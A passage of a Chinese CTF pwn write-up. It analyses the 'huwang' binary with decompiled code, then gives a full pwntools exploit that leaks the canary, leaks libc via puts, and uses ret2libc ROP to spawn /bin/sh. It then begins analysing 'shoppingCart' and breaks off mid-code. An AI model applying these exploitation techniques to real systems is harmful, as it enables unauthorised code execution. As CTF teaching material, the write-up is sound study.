class="built_in">rbp</span>  <span class="number">0x7fffffffdc70</span> —▸ <span class="number">0x7fffffffdd00</span> —▸ <span class="number">0x7fffffffdd10</span> —▸ <span class="number">0x401510</span> ◂— <span class="keyword">push</span>   <span class="built_in">r15</span></span><br><span class="line">得出一个结论，每次程序运行后，所有函数使用的canary值是一样的，以前我认为是不一样的。我没有做更多的验证，所以我也不是很确定对不对。</span><br><span class="line">还有就是都是从<span class="built_in">fs</span>：<span class="number">0x28</span>取canary。</span><br></pre></td></tr></table></figure><p>我们绕过了MD5验证，进入cmp_md5_true()函数看看。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">fastcall <span class="title">cmp_md5_true</span><span class="params">(__int64 name)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v1; <span class="comment">// ST1B_1</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+1Ch] [rbp-214h]</span></span><br><span class="line">  <span class="keyword">char</span> occupation; <span class="comment">// [rsp+20h] [rbp-210h]</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+120h] [rbp-110h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+228h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);                    <span class="comment">// canary</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Congratulations, %s guessed my secret!\n"</span>, name);<span class="comment">// leak canary</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"And I want to know someting about you, and introduce you to other people who guess the secret!"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"What`s your occupation?"</span>);</span><br><span class="line">  get_choose(&amp;occupation, <span class="number">255L</span>L);</span><br><span class="line">  v3 = <span class="built_in">snprintf</span>(</span><br><span class="line">         &amp;s,</span><br><span class="line">         <span class="number">0xFF</span>uLL,</span><br><span class="line">         <span class="string">"I know a new friend, his name is %s,and he is a noble %s.He is come from north and he is very handsome........."</span></span><br><span class="line">         <span class="string">"................................................................................................."</span>,</span><br><span class="line">         name,</span><br><span class="line">         &amp;occupation);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Here is your introduce"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;s);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Do you want to edit you introduce by yourself[Y/N]"</span>);</span><br><span class="line">  v1 = getchar();</span><br><span class="line">  getchar();</span><br><span class="line">  <span class="keyword">if</span> ( v1 == <span class="string">'Y'</span> )</span><br><span class="line">    read(<span class="number">0</span>, &amp;s, v3 - <span class="number">1</span>);                        <span class="comment">// stack overflow</span></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">"The final presentation is as follows:%s\n"</span>, &amp;s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;当我们输入的名字长度为0x19字节时，就可以leak出canary,得到canary，我们就可以绕过canary保护机制，然后再利用ROP绕过NX,执行shellcode了。由于libc是开启PIE的，所以我们直接使用确定的函数地址，只能动态获得。我们通过调用cmp_md5_true()函数，传入参数为puts()函数的got表地址，因为之前已经调用过puts()函数了，所以可以直接打印出puts()函数的地址。然后我们就可以确定libc的基地址，从而获得system()的地址和/bin/sh的地址。获得shell。</p><h4 id="0x03-exp-2"><a href="#0x03-exp-2" class="headerlink" title="0x03 exp"></a>0x03 exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">context.clear()</span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line">context.binary =<span class="string">'./huwang'</span></span><br><span class="line">context = &#123;<span class="string">'arch'</span>:<span class="string">'amd64'</span>,<span class="string">'bits'</span>:<span class="string">'64'</span>,<span class="string">'endian'</span>:<span class="string">'little'</span>,<span class="string">'os'</span>:<span class="string">'linux'</span>&#125;</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">'./libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line">elf = ELF(<span class="string">'./huwang'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x401573</span></span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">cmp_md5_true = <span class="number">0x40101C</span></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">option_666</span><span class="params">(io,name,guess,encrypt_num,md5_ciphertext,flag)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'command&gt;&gt; \n'</span>)</span><br><span class="line">    io.sendline(<span class="string">'666'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'please input your name\n'</span>)</span><br><span class="line">    io.send(name)</span><br><span class="line">    io.recvuntil(<span class="string">'Do you want to guess the secret?\n'</span>)</span><br><span class="line">    io.sendline(guess)</span><br><span class="line">    io.recvuntil(<span class="string">'Input how many rounds do you want to encrypt the secret:\n'</span>)</span><br><span class="line">    io.sendline(str(encrypt_num))</span><br><span class="line">    <span class="keyword">if</span> flag == <span class="number">1</span>:</span><br><span class="line">        io.recvuntil(<span class="string">'Try to guess the md5 of the secret\n'</span>)</span><br><span class="line">        io.send(md5_ciphertext)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug_remote</span><span class="params">(ip,port,breakpoint)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> debug == <span class="number">1</span>:</span><br><span class="line">        io = process(<span class="string">'./huwang'</span>,env = &#123;<span class="string">'LD_PRELOAD'</span> : <span class="string">'./libc.so.6'</span>&#125;)</span><br><span class="line">        <span class="comment"># gdb.attach(io,breakpoint)</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io = remote(ip,port)</span><br><span class="line">    <span class="keyword">return</span> io</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5_encrypt</span><span class="params">(plaintext)</span>:</span></span><br><span class="line">    md = hashlib.md5()</span><br><span class="line">    md.update(plaintext.encode())</span><br><span class="line">    ciphertext = md.hexdigest()</span><br><span class="line">    <span class="keyword">return</span> ciphertext.decode(<span class="string">'hex'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span><span class="params">(ip,port)</span>:</span></span><br><span class="line">    io1 = debug_remote(ip,port,<span class="string">''</span>)</span><br><span class="line">    option_666(io1,<span class="string">'Sp4n9x'</span>,<span class="string">'y'</span>,<span class="number">-1</span>,<span class="string">'Sp4n9x'</span>,<span class="number">0</span>)</span><br><span class="line">    io1.recvuntil(<span class="string">'timeout~\n'</span>)</span><br><span class="line"></span><br><span class="line">    io2 = debug_remote(ip,port,<span class="string">'b *0x040110D\nc'</span>)</span><br><span class="line">    md5_ciphertext = md5_encrypt(<span class="string">'\x00'</span>*<span class="number">16</span>)</span><br><span class="line">    option_666(io2,<span class="string">'Sp4n9x'</span>.rjust(<span class="number">0x19</span>,<span class="string">'A'</span>),<span class="string">'y'</span>,<span class="number">1</span>,md5_ciphertext,<span class="number">1</span>)</span><br><span class="line">    io2.recvuntil(<span class="string">'Sp4n9x'</span>.rjust(<span class="number">0x19</span>,<span class="string">'A'</span>))</span><br><span class="line">    <span class="comment"># gdb.attach(io2)</span></span><br><span class="line">    canary = u64(<span class="string">'\x00'</span> + io2.recvn(<span class="number">7</span>))</span><br><span class="line">    <span class="keyword">print</span> hex(canary)</span><br><span class="line">    io2.recvuntil(<span class="string">'What`s your occupation?\n'</span>)</span><br><span class="line">    io2.send(<span class="string">'A'</span>*<span class="number">0xff</span>)</span><br><span class="line">    io2.recvuntil(<span class="string">'Do you want to edit you introduce by yourself[Y/N]\n'</span>)</span><br><span class="line">    io2.sendline(<span class="string">'Y'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    stack status</span></span><br><span class="line"><span class="string">    0x4141414141414141</span></span><br><span class="line"><span class="string">    ........</span></span><br><span class="line"><span class="string">    0x0200cf560c7a0a41 &lt;- canary</span></span><br><span class="line"><span class="string">    0x0000000000000000 &lt;- rbp</span></span><br><span class="line"><span class="string">    0x0000000000401573 &lt;- pop rdi ; ret</span></span><br><span class="line"><span class="string">    0x0000000000602F70 &lt;- puts_got</span></span><br><span class="line"><span class="string">    0x000000000040101C &lt;- cmp_md5_true</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    shellcode1 = <span class="string">'A'</span>*<span class="number">0x108</span> + p64(canary) + p64(<span class="number">0</span>)</span><br><span class="line">    shellcode1 += p64(pop_rdi_ret) + p64(puts_got) + p64(cmp_md5_true)</span><br><span class="line">    io2.send(shellcode1)</span><br><span class="line">    io2.recvuntil(<span class="string">'Congratulations, '</span>)</span><br><span class="line">    puts_addr = u64(io2.recvn(<span class="number">6</span>) + <span class="string">'\x00'</span>*<span class="number">2</span>)</span><br><span class="line">    libc_base = puts_addr - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">    system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">    binsh_addr = libc_base + int(next(libc.search(<span class="string">'/bin/sh'</span>),<span class="number">16</span>))</span><br><span class="line">    io2.recvuntil(<span class="string">'What`s your occupation?\n'</span>)</span><br><span class="line">    io2.send(<span class="string">'A'</span>*<span class="number">0xff</span>)</span><br><span class="line">    io2.recvuntil(<span class="string">'Do you want to edit you introduce by yourself[Y/N]\n'</span>)</span><br><span class="line">    io2.sendline(<span class="string">'Y'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    stack status</span></span><br><span class="line"><span class="string">    0x4141414141414141</span></span><br><span class="line"><span class="string">    ........</span></span><br><span class="line"><span class="string">    0x0200cf560c7a0a41 &lt;- canary</span></span><br><span class="line"><span class="string">    0x0000000000000000 &lt;- rbp</span></span><br><span class="line"><span class="string">    0x0000000000401573 &lt;- pop rdi ; ret</span></span><br><span class="line"><span class="string">    0x0000000000602F70 &lt;- '/bin/sh'</span></span><br><span class="line"><span class="string">    0x000000000040101C &lt;- system</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    shellcode2 = <span class="string">'A'</span>*<span class="number">0x108</span> + p64(canary) + p64(<span class="number">0</span>)</span><br><span class="line">    shellcode2 += p64(pop_rdi_ret) + p64(binsh_addr) + p64(system_addr)</span><br><span class="line">    io2.send(shellcode2)</span><br><span class="line"></span><br><span class="line">    io2.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exploit(<span class="string">'127.0.0.1'</span>,<span class="number">1000</span>)</span><br></pre></td></tr></table></figure><h4 id="0x04-总结-2"><a href="#0x04-总结-2" class="headerlink" title="0x04 总结"></a>0x04 总结</h4><p>这道题前面的Note菜单有点迷惑人，让人以为是一道堆相关的题目，打开IDA分析后，发现与堆没有任何关系。主要考查的是，open()的参数flags的几个选项的作用。还有就是有符号数与无符号数进行比较会发生的错误。以及通过泄露canary的值实现栈溢出，通过ROP绕过NX保护，ret2libc获取shell。</p><h3 id="shoppingCart"><a href="#shoppingCart" class="headerlink" title="shoppingCart"></a>shoppingCart</h3><h4 id="0x00-file-amp-amp-checksec-3"><a href="#0x00-file-amp-amp-checksec-3" class="headerlink" title="0x00 file &amp;&amp; checksec"></a>0x00 file &amp;&amp; checksec</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ file shoppingCart </span><br><span class="line">shoppingCart: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=3fcbc93317b6160fe21ecee679180c2a99c67685, stripped</span><br><span class="line">$ checksec shoppingCart </span><br><span class="line">[*] &apos;/home/...../Desktop/shoppingcart/shoppingCart&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>恩，一个64bit的程序，去除了符号表，开启了全部保护。开了PIE就需要泄露地址，所以有点麻烦。</p><h4 id="0x01-运行程序，观察程序功能-1"><a href="#0x01-运行程序，观察程序功能-1" class="headerlink" title="0x01 运行程序，观察程序功能"></a>0x01 运行程序，观察程序功能</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">buffer@ubuntu64:~/Desktop/shoppingcart$ ./shoppingCart </span><br><span class="line">/***</span><br><span class="line">*    |)    |)    |)    </span><br><span class="line">*    |)L|\/|)L|\/|)L|\/ </span><br><span class="line">*        /     /     / </span><br><span class="line">*/</span><br><span class="line">EMMmmm, you will be a rich man!</span><br><span class="line">cmskmsk</span><br><span class="line">EMMmmm, you will be a rich man!</span><br></pre></td></tr></table></figure><p>程序只是输出了一些信息，并未提示让我们输入什么。所以利用IDA静态分析一下。</p><h4 id="0x02-IDA静态分析"><a href="#0x02-IDA静态分析" class="headerlink" title="0x02 IDA静态分析"></a>0x02 IDA静态分析</h4><p>mian()函数里有两个自定义函数。</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall main(__int64 a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  puts(<span class="string">"/***\n*    |)    |)    |)    \n*    |)L|\\/|)L|\\/|)L|\\/ \n*        /     /     / \n*/"</span>)<span class="comment">;</span></span><br><span class="line">  money_menu()<span class="comment">;</span></span><br><span class="line">  goods_menu()<span class="comment">;</span></span><br><span class="line">  puts(<span class="string">"Happy Shopping Day!\nbye~"</span>)<span class="comment">;</span></span><br><span class="line">  return 0LL<span class="comment">;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一个是与money有关的函数，一个是与goods有关的函数。我们先来看看money_menu()。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">money_menu</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 option_num; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> option_str; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 canary; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  canary = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"EMMmmm, you will be a rich man!"</span>);</span><br><span class="line">      fgets(&amp;option_str, <span class="number">24</span>, <span class="built_in">stdin</span>);</span><br><span class="line">      option_num = strtoul(&amp;option_str, <span class="number">0L</span>L, <span class="number">0</span>);<span class="comment">// 将输入的字符串转化为无符号长整型</span></span><br><span class="line">      <span class="keyword">if</span> ( option_num != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      removemoney();                            <span class="comment">// 输入2时，删除money</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( option_num == <span class="number">3</span> )                      <span class="comment">// 输入3时，跳出</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( option_num == <span class="number">1</span> )                      <span class="comment">// 输入1时，获取money</span></span><br><span class="line">      getmoney();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ canary;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们需要输入一个选项，来进入不同的功能。经过分析，输入2时，会执行删除money的操作，但是里面只是提示了不能删除。所以这个功能并没有什么用。输入3时跳出money_menu。输入1时执行getmoney()，所以，我们进入这个函数去看一下。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getmoney</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 *v0; <span class="comment">// rax</span></span><br><span class="line">  money *money_ptr1; <span class="comment">// rax</span></span><br><span class="line">  money *money_ptr2; <span class="comment">// ST08_8</span></span><br><span class="line">  __int64 v3; <span class="comment">// rax</span></span><br><span class="line">  __int64 money_num; <span class="comment">// rcx money_list索引</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( money_sum &lt;= <span class="number">19</span> )                        <span class="comment">// money种类数量</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"I will give you $9999, but what's the  currency type you want, RMB or Dollar?"</span>);</span><br><span class="line">    money_ptr1 = <span class="built_in">malloc</span>(<span class="number">16u</span>LL);                 <span class="comment">// 给结构体分配内存</span></span><br><span class="line">    money_ptr2 = money_ptr1;</span><br><span class="line">    money_ptr1-&gt;num = <span class="number">9999L</span>L;</span><br><span class="line">    fgets(&amp;money_type[<span class="number">8</span> * money_sum], <span class="number">8</span>, <span class="built_in">stdin</span>);<span class="comment">// 将money_type存到.bss段的数组中</span></span><br><span class="line">    money_ptr2-&gt;money_type = &amp;money_type[<span class="number">8</span> * money_sum];<span class="comment">// 将money_type的字符串指针存入结构体成员money_type中</span></span><br><span class="line">    v3 = money_sum++;</span><br><span class="line">    money_num = v3;</span><br><span class="line">    v0 = money_list;</span><br><span class="line">    money_list[money_num] = money_ptr2;         <span class="comment">// 将结构体指针存到.bss段的数组中</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    LODWORD(v0) = <span class="built_in">puts</span>(<span class="string">"You already have enough money!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里是经过优化的代码，我们看起来会比较好理解一点，原本并不是这样的。初始状态不仔细看是不容易看不出来有money和goods两个结构体的(对于新手来说)，我们需要利用IDA的优化代码的功能，添加这两个结构体。具体的添加方法可以参考IDA Pro权威指南。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">00000000 money           struc ; (sizeof=0x10, mappedto_6)</span><br><span class="line">00000000 money_type      dq ?</span><br><span class="line">00000008 num             dq ?</span><br><span class="line">00000010 money           ends</span><br><span class="line">00000010</span><br><span class="line">00000000 ; ---------------------------------------------------------------------------</span><br><span class="line">00000000</span><br><span class="line">00000000 goods           struc ; (sizeof=0x10, mappedto_7)</span><br><span class="line">00000000 goods_name      dq ?</span><br><span class="line">00000008 num             dq ?</span><br><span class="line">00000010 goods           ends</span><br><span class="line">00000010</span><br></pre></td></tr></table></figure><p>这个函数能够在堆上最多定义20个money结构体，每个money结构体具有两个成员，money_type和num，num是固定的9999，money_type是任意的，也可以使用题目说的RMB和Dollar，并不会影响解题。结构体对象是存在堆上的，前8个字节存储money_type字符串的地址，而money_type是存储在.bss段的，并且最后也会将money结构体对象的指针存入.bss段的一个数组中，我将其命名为money_list。</p><p>我们再来看看goods_menu()函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">goods_menu</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 option_num; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> option_str; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 canary; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  canary = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">"Now, buy buy buy!"</span>);</span><br><span class="line">          fgets(&amp;option_str, <span class="number">24</span>, <span class="built_in">stdin</span>);</span><br><span class="line">          option_num = strtoul(&amp;option_str, <span class="number">0L</span>L, <span class="number">0</span>);</span><br><span class="line">          <span class="keyword">if</span> ( option_num != <span class="number">2</span> )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          delete_goods();                       <span class="comment">// 输入2，删除goods</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( option_num &gt; <span class="number">2</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span> ( option_num == <span class="number">1</span> )</span><br><span class="line">          add_goods();                          <span class="comment">// 输入1，添加goods</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( option_num != <span class="number">3</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      edit_goods();                             <span class="comment">// 输入3，编辑goods</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( option_num != <span class="number">4</span> );</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ canary;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>goods具有三个选项，add、delete、edit，问题出现在add_goods()函数和edit_goods()函数中。这里需要说明一下，用堆的做法，会涉及到add_goods()和edit_goods()中的两个漏洞，另一种方法只会使用到edit_goods()中用来泄露地址的漏洞。这里先说说不用堆的方法吧，用堆的方法，我暂时还没有弄清楚，我们进入edit_goods()函数看一下。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">edit_goods</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 goods_num; <span class="comment">// rax</span></span><br><span class="line">  __int64 v1; <span class="comment">// ST00_8 v1=goods_num</span></span><br><span class="line">  <span class="keyword">char</span> goods_num_str; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 canary; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  canary = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Which goods you need to modify?"</span>);</span><br><span class="line">  fgets(&amp;goods_num_str, <span class="number">24</span>, <span class="built_in">stdin</span>);             <span class="comment">// 这里输入负数，经过strtoul转换后，会造成数组的越界访问</span></span><br><span class="line">  goods_num = strtoul(&amp;goods_num_str, <span class="number">0L</span>L, <span class="number">0</span>);</span><br><span class="line">  <span 